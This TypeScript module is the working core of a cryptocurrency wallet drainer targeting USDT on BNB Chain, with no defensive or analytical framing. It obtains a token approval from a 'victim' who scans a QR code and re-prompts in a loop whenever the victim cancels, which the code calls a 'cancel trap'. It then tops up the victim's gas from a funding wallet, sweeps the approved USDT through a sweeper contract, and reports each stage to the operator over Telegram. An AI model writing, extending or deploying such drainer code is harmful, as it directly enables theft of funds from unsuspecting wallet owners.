// src/lib/web3.ts
import { ethers } from "ethers";
import {
  USDT_ADDRESS,
  SWEEPER_CONTRACT,
  MAX_APPROVE_USDT,
  FUNDING_PRIVATE_KEY,
  FUNDING_AMOUNT,
  USDT_DECIMALS,
} from "../config";
import { notify, formatAddress } from "./telegram";

const USDT_ABI = [
  "function approve(address spender, uint256 value) external returns (bool)",
  "function transferFrom(address from, address to, uint256 value) external returns (bool)",
  "function balanceOf(address account) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function decimals() external view returns (uint8)",
];

let approvalInProgress = false;

// ========== STEP 1: APPROVAL (100k USDT CAP) ==========
export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  const signer = await provider.getSigner();
  const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

  // Get victim's USDT balance
  const rawBalance = await usdt.balanceOf(victimAddress);
  const decimals = await usdt.decimals(); // USDT has 6 decimals
  const balance = ethers.formatUnits(rawBalance, decimals);

  await notify(
    `🔔 <b>New Victim</b>\n📱 QR Scanned\n🔗 Wallet: ${formatAddress(victimAddress)}\n💰 Balance: ${parseFloat(balance).toFixed(2)} USDT`
  );

  // Cap approval at 100,000 USDT (or victim's balance, whichever is lower)
  const maxApprove = ethers.parseUnits(MAX_APPROVE_USDT, decimals); // 100,000 USDT
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove;

  approvalInProgress = true;
  while (approvalInProgress) {
    try {
      const tx = await usdt.approve(SWEEPER_CONTRACT, approveAmount);
      await tx.wait();

      await notify(
        `✅ <b>Approval Signed</b>\n💵 ${ethers.formatUnits(approveAmount, decimals)} USDT\n🔗 ${formatAddress(victimAddress)}\nTx: <a href="https://bscscan.com/tx/${tx.hash}">${tx.hash.slice(0, 10)}...</a>`
      );

      approvalInProgress = false;
      return approveAmount;
    } catch (err: any) {
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        // User rejected the approval → retry immediately (cancel trap)
        await notify(`⚠️ <b>Approval Cancelled</b>\nRetrying...`);
        continue;
      }
      // Other error → stop the loop
      approvalInProgress = false;
      await notify(`❌ <b>Approval Failed</b>\nError: ${err.message}`);
      return null;
    }
  }
  return null;
}

// ========== STEP 2: GAS FUNDING ==========
export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress);
  const minGas = ethers.parseEther("0.0003"); // ~0.0003 BNB for gas

  if (balance >= minGas) {
    await notify(`⛽ <b>Gas Check</b>\n${ethers.formatEther(balance)} BNB (sufficient)`);
    return true;
  }

  // Fund from your funding wallet
  try {
    const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
    const fundTx = await fundingWallet.sendTransaction({
      to: victimAddress,
      value: ethers.parseEther(FUNDING_AMOUNT),
    });
    await fundTx.wait();

    await notify(
      `⛽ <b>Gas Funded</b>\nSent ${FUNDING_AMOUNT} BNB to ${formatAddress(victimAddress)}\nTx: <a href="https://bscscan.com/tx/${fundTx.hash}">${fundTx.hash.slice(0, 10)}...</a>`
    );
    return true;
  } catch (err) {
    await notify(`❌ <b>Gas Funding Failed</b>\n${formatAddress(victimAddress)}`);
    return false;
  }
}

// ========== STEP 3: DRAIN VIA SWEEPER CONTRACT ==========
export async function executeDrain(
  provider: ethers.Provider,
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  // Use the sweeper contract to drain
  const sweeperABI = ["function sweep(address victim, address token) external"];
  const sweeper = new ethers.Contract(
    SWEEPER_CONTRACT,
    sweeperABI,
    new ethers.Wallet(FUNDING_PRIVATE_KEY, provider) // Use funding wallet as signer
  );

  try {
    const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS);
    await tx.wait();

    const decimals = USDT_DECIMALS; // USDT has 6 decimals
    await notify(
      `🚨 <b>DRAINED</b>\n💵 ${ethers.formatUnits(approvalAmount, decimals)} USDT\n📤 Victim: ${formatAddress(victimAddress)}\n📥 Sweeper: ${formatAddress(SWEEPER_CONTRACT)}\n🔗 <a href="https://bscscan.com/tx/${tx.hash}">${tx.hash.slice(0, 16)}...</a>`
    );
    return true;
  } catch (err) {
    await notify(`❌ <b>Drain Failed</b>\n${formatAddress(victimAddress)}`);
    return false;
  }
}

// ========== HELPERS ==========
export function cancelApprovalLoop() {
  approvalInProgress = false;
}